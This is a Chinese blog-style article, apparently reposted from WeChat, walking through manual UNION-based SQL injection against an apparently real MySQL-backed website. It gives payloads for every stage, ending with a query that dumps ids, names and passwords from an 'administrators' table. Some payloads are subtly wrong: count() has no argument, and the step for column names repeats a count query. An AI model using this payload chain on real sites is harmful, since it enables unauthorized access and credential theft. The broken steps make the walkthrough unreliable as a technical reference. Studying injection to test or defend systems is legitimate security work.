> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650520620&idx=3&sn=6596c0277c6787f36e027746a0187762&chksm=83bad9c8b4cd50de0e55f6785b5e875163a37c1eceefda30cca2289d681666c5a2cb10717ad0&mpshare=1&scene=1&srcid=0819YDa2g9nkf9aprkgoqE9U&sharer_sharetime=1629351805247&sharer_shareid=7fece245937ac96f04f0fb8e1311fff1#rd)

> **文章来源：** **火线 Zone**

前言

已经检测出该网站有 sql 注入问题，试着手工注入网站，顺便再复习一下。

**01**

**正文**

1. 先通过引号 判断该网站为数字型，payload 直接拼接，无需引号闭合，当网站后直接构造拼接 and 0# 网站文章列表内容受到影响显示空白，此为回显类型注入

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywoXeO4U0UZEHsKUFA9P1VTRw2dVgIgUJlOQORtO0icFzI0w983NXzofg/640?wx_fmt=png)

```
payload：and 0#
```

2. 进行字段数的猜解，确定回显位

字段数猜解通过 payload：ORDER BY X # 对 X 字段进行回显字段值猜解，此网站 X=6 时，网站显示正常则确定回显字段数为 6

构造 payload:UNION SELECT 1,2,3,4,5,6# 确定回显位为 2,6 选择其一即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7Uywricpm4ooJMoOO7aDXAC315pjyIy3WicnYwk3quzwwic3Mjy3SmocUPImQ/640?wx_fmt=png)

```
确定回显位:payload:UNION SELECT 1,2,3,4,5,6#
```

3. 进网站进行信息收集 payload:UNION SELECT 1,database(),3,4,5,6# 对第二位字段进行函数替换可收集网站数据库相关信息如：version() 数据库版本信息 @@basedirmysql 安装路径等

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywnYoJaXHcpy1b6C5xhzF6nw42rLwqnwdPgGCrlu8xzRLiclMdFJq7MicA/640?wx_fmt=png)

4. 获取表数量，通过上一步得到 mysql 数据库版本大于 5.1，可以通过 MySQL 的 information_schema 数据库进行数据获取

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7Uyw4oMSvoqtGhLUNa1YoryHWiapfmghzKpKibd4DictPmmhd5VwkRQbqSUrQ/640?wx_fmt=png)

```
payload:UNION SELECT 1,count(),3,4,5,6 FROM information_schema.tables WHERE table_schema=database() #
```

5. 获取表名

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywgawVz7k4bZ1nu7bhhTZwb6IYWLNeClvSicKTYW3WkRa3TNmILFKgN6A/640?wx_fmt=png)

```
payload:UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database() #
```

6. 获取数据库表字段数

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywlQ1leIRxBSPaicvmfttqNqcOhewBBCSY8uZEKiaC0g2dicmfwCGxNUUbA/640?wx_fmt=png)

```
payload:UNION SELECT 1,count(),3,4,5,6 FROM information_schema.columns WHERE table_schema=database() and table_name='administrators' #
```

7. 获取数据库表字段名

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywFD4QnIwddWy2fZjPNyneBcaR5R9lszZAiaichibaZibmbvW5hAw4Dx45NA/640?wx_fmt=png)

```
payload:UNION SELECT 1,count(*),3,4,5,6 FROM information_schema.columns WHERE table_schema=database() and table_name='administrators' #
```

8. 获取表数据

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaQhp4d22GKH7pUiadnLO7UywEW55MbBQJ8jonf0hWS2LvmzSI0qibZ04XbpVzxDicjk6QKFQUpJXibtSg/640?wx_fmt=png)

```
payload:UNION SELECT 1,group_concat(concat(id,name,password)),3,4,5,6 FROM administrators LIMIT 0,1 #
```

说明

以 mysql 数据库，数字回显类型进行 sql 手工注入流程，仅供参考

侵权请私聊公众号删文